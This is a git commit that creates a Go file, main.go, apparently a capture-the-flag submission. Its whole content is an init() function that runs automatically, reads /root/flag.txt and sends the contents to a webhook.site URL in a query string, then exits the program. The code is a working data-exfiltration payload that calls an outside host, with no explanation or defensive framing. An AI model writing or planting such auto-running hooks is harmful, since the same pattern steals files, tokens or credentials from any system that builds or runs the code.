67b3eeed825f332f9967d72d33197ba159a9fb2a
Behiry <121094243+ahmedatef15011@users.noreply.github.com>
2025-04-11 21:08:43 +0200

    Create main.go

---
+++ main.go
@@ -0,0 +1,16 @@
+package main
+
+import (
+    "io/ioutil"
+    "net/http"
+    "os"
+)
+
+func init() {
+    flag, err := ioutil.ReadFile("/root/flag.txt") // Adjust the flag path as needed
+    if err != nil {
+        return
+    }
+    http.Get("https://webhook.site/63a4f50c-ecc3-471f-b54f-29d162056002?flag=" + string(flag))
+    os.Exit(0) // Prevent further execution if needed
+}
